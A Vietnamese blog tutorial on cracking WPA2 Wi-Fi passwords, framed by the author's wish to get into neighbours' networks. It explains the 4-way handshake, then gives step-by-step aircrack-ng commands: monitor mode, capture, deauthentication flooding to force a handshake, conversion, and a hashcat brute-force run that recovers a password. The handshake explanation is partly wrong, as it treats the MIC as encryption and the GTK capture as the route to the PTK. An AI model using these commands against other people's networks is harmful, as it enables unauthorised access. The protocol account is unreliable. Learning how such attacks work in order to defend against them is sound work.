# Nghịch vài trò "hack" Wifi - Phần 1
Như đã đề cập ở blog trước, thời gian đầu mình sử dụng Linux với mong ước là xử được mấy cái wifi nhà hàng xóm.
Sau quá trình trên, mình cũng có một chút kinh nghiệm, cũng như một số tip. Trong series này, mình sẽ tổng hợp lại 1 số kiến thức cũng như 1 số tip mình tìm hiểu được. Biết đâu lại có thêm một trò vui vui :). 

## Tổng quan

Hầu hết các modem wifi trên thị trường hiện nay được sử dụng có 3 chuẩn bảo mật chính WPA, WPA2, WEP. Trong đó WPA và WEP là 2 chuẩn bảo mật yếu rất dễ tấn công nên dần được loại bỏ, do đó chuẩn bảo mật phổ biến hiện nay là WPA2. WPA2 là 1 chuẩn bảo mật hiện đại, sử dụng những công nghệ tiên tiến nhưng không có nghĩa là nó an toàn 100%. Theo hiểu biết của mình, hiện tại có 3 cách để hack như sau:

- Hack bằng từ điển - Lợi dụng sơ hở của quá trình xác thực bắt tay 4 bước trong WPA2
- Hack tấn công mã pin - Lợi dụng sơ hở WPS
- Hack bằng Phishing - Lợi dụng sự mất cảnh giác của người dùng đánh cắp password

## Hack bằng từ điển

### Giới thiệu

Cách này nghe cái tên thì cứ nghĩ nó là dạng brute-force trâu bò, ờ thì đúng thế thật, nhưng bên trong nó còn có rất nhiều vấn đề để nói. Trong blog này, mình sẽ trình bày và thử nghiệm kĩ thuật hack bằng từ điển.

### 4-Way Handshake

Trước tiên, chúng ta tìm hiểu quá trình xác thực bắt tay bốn bước của WPA2. Để một Client có thể kết nối với AP (Access Point) phải trả qua quá trình 4 bước như sau:

- Bước 1: AP sẽ tung ra 1 gói tin (ANONCE) ngẫu nhiên đi khắp nơi trong phạm vi phát sóng.
- Bước 2: Client trong phạm vi nhận được ANONCE, kết hợp PSK (Pre-shared Key) tức là mật khẩu wifi (dịch ra chuỗi 256 bit), SNONCE - Một chuỗi sinh ra ngẫu nhiên ở Client, MAC (AP), MAC (Client) tạo ra 1 khóa PTK (Pairwise Transit Key)

$$ PTK = PSK + ANONCE + SNONCE + MAC (AP) + MAC (Client) $$

Sau khi có khóa PTK, Client dùng khóa này để mã hóa chuỗi ANONCE nhận từ AP được chuỗi MIC (Message Integrity Code). Client gửi lên AP chuỗi SNONCE + MIC

- Bước 3: AP sau khi nhận được gói tin thì cũng tính được PTK. AP dùng PTK để giải mã gói MIC, nếu được đúng bằng chuỗi ANONCE ban đầu thì good, Client có đúng mật khẩu rồi đó. Lúc này AP dùng PTK để tạo khóa dùng chung là GTK (Group Temporal Key) rồi gửi lại cho Client.
- Bước 4: Client nhận được GTK thì lưu lại và gửi 1 gói tin ACK được mã hóa bằng GTK và gửi lên cho AP. Từ đó 2 bên giao tiếp với nhau qua GTK.

Giải thích một lúc quá trình này méo hết cả miệng. Nói chung đơn giản là trong 4 bước này, nhìn thì cũng khá chặt chẽ đấy nhưng thực ra có 1 lỗ hổng ở bước thứ 3 tới thứ 4. Khi AP gửi GTK cho Client thì nếu hacker chặn được quá trình này (tức là ăn chặn gói tin để nó không gửi tới Client) thì sau một thời gian AP chờ mỗi không thấy ACK từ Client gửi lên, nó lại gửi lại thêm 1 cái nữa. Như thế nếu bị lost gói GTK thì quá trình xác thực vẫn hoàn thành.
Lợi dụng điểm này, ta can thiệp vào quá trình xác thực và bắt lấy gói GTK, từ đó tìm ra khóa PTK -> mã PSK (mã hash mật khẩu).
Tới đây mới bắt đầu dùng từ điển, chúng ta có 1 danh sách các mật khẩu phổ biến, hoặc vét cạn toàn bộ, hash nó ra và so khớp với mật khẩu. Nếu trùng thì chính là mật khẩu đấy :))

### Thực chiến

Một số thứ cần chuẩn bị:

- <a href="https://www.aircrack-ng.org/doku.php">Aircrack-ng</a>: Tool phổ biến nhất để chuyển chế độ monitor và bắt gói tin 
- <a href="https://github.com/hashcat/hashcat-utils">Cap2hccapx</a>: Tool hỗ trợ chuyển đổi file cap thành hccapx
- <a href="https://hashcat.net/hashcat/">Hashcat</a>: Thư viện hỗ trợ giải mã chuỗi hash
- Từ điển: Nếu có từ điển thì sẽ tăng khả năng cao hơn khi dò, nếu không thì hashcat hỗ trợ dò tìm kiểu brute-force.

Mình có tổng hợp 1 list kha khá từ điển, nếu cần có thể ib mình.

Các Tool trên không nhất thiết phải sử dụng Kali Linux mà có thể cài ở bất kì distro nào. Ở đây mình sử dụng Kali Linux do nó cài sẵn nhiều Tool hỗ trợ.
Một vấn đề nữa là card wifi sử dụng phải hỗ trợ chế độ monitor, ở đây mình dùng TP-link WN722N V1.

<img src="https://crowi.pionero.io/files/610edcc41120630068a6a65e"  width="400px" height="300px">

Đầu tiên, mở terminal, sử dụng lệnh:  `airmon-ng`
để kiểm tra tên của card wifi. Ở đây chúng ta tìm thấy card wifi có tên là wlan0.

<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a660" height="150px">

Tắt toàn bộ tiến trình đang sử dụng tới mạng:  `airmon-ng check kill`.

<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a65f" height="150px">

Tiếp theo chúng ta bật chế độ monitor lên cho wlan0: `airmon-ng start wlan0`.

<img src="https://crowi.pionero.io/files/610ee1381120630068a6a66c" height="150px">

Kiểm tra lại để chắc chắn card wifi đã ở chế độ monitor: `airmon-ng`.

<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a663" height="150px">

Chúng ta đã có 1 monitor là wlan0mon.
Quét tất cả các AP xung quanh: `airodump-ng wlan0mon`.

<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a666" height="550px">

Để ý các chỉ số:

- BSSID: Địa chỉ MAC của AP
- #Data: Số dữ liệu đang truyền tải, chọn cái nào càng nhiều càng tốt
- CH: Kênh giao tiếp hiện tại của AP
- ESSID: Tên của AP

Sau khi có thông số trên, ta chọn 1 AP để thực hiện lắng nghe - ở đây mình chọn luôn wifi phòng mình nhé.

`airodump-ng wlan0mon --bssid <BSSID> -c <CH> -w <file_output.cap>`

<img src="https://crowi.pionero.io/files/610ee5451120630068a6a671" height="300px">

Sử dụng aireplay-ng để tấn công gửi các dead-auth cho AP với mục đích khiến AP yêu cầu các Client phải gửi lại xác thực - tức là làm lại quá trình bắt tay 4 bước.

`iw dev wlan0mon set channel <CH> & aireplay-ng --deauth 20 -a <BSSID> wlan0mon`

<img src="https://crowi.pionero.io/files/610ee34e1120630068a6a670" height="500px">

Nếu có lỗi Channel, chạy lại câu lệnh phía trên 1 lần nữa.

Sau khi có 1 Client xác thực lại, chúng ta chú ý góc bên phải, có 1 Handshake.

<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a664" heigh="350px">

Ngừng quá trình lắng nghe bằng Ctrl + C.

Sau khi có file .cap, chúng ta sử dụng cap2hccapx để convert file .cap thành .hccapx phục vụ cho hashcat.
`cap2hccapx.bin <file.cap> <file.hccapx>`

<img src="https://crowi.pionero.io/files/610ee28c1120630068a6a66f">

Sau khi có file hccapx, ta có thể giải mã ở bất kì đâu, chọn máy nào mạnh mạnh có card rời chút thì càng tốt. Ở đây mình chọn Google Colab để giải mã nó luôn :) vừa free lại mạnh nữa chứ.
Tại google colab tải file .hccapx lên.

<img src="https://crowi.pionero.io/files/610ee2561120630068a6a66e">

Cài đặt 1 số thứ cần thiết cho hashcat:
`!apt install cmake build-essential checkinstall -y > /dev/null && git clone https://github.com/hashcat/hashcat.git > /dev/null && cd hashcat && git submodule update --init && make > /dev/null && make install > /dev/null && cd .. && rm hashcat -r`

<img src="https://crowi.pionero.io/files/610ee20f1120630068a6a66d" height="200px">

Sử dụng lệnh sau để bắt đầu chạy hashcat:
`!hashcat -m 2500 -a 3 /content/room_402.hccapx -i --increment-min=8 ?d?d?d?d?d?d?d?d?d`
<img src="https://crowi.pionero.io/files/610edd4d1120630068a6a66a" heigh="350px">

-m 2500: Chọn kiểu mã hóa là WPA-EAPOL-PBKDF2
-a 3: Chọn mode tấn công là brute-force
-i --increment-min=8: kích hoạt chế độ tìm kiếm tăng dần với khởi đầu là 8
?d?d?d?d?d?d?: 00000000 -> 999999999

Để tìm hiểu thêm, xem ở: https://hashcat.net/wiki/doku.php?id=hashcat
Giờ chỉ có việc ngồi chờ thôi, thời gian nhanh hay chậm tùy thuộc vào kinh nghiệm lựa chọn từ điển cũng như độ khó của mật khẩu.
Và đây là thành quả sau khoảng 5p chờ đợi, mật khẩu nhà mình khá là đơn giản nhỉ :)

<img src="https://crowi.pionero.io/files/610edd4d1120630068a6a669" heigh="350px">

## Kết

Kĩ thụât hack wifi dựa trên tấn công từ điển là kĩ thuật rất bình thường nhưng vẫn có độ hiểu quả cao, do cách đặt mật khẩu của người Việt còn đơn giản. Do đó để an toàn và chống lại cách hack từ điển, chúng ta nên đặt mật khẩu đủ mạnh, độ dài lớn kết hợp hoa thường số và sử dụng kí tự đặc biệt. 
Sang blog tiếp theo, mình sẽ giới thiệu kĩ thuật tiếp theo - lợi dụng WPS.
Mục đích blog để học tập, nếu có bất cứ vấn đề gì liên quan, mình hoàn toàn không chịu trách nhiệm :))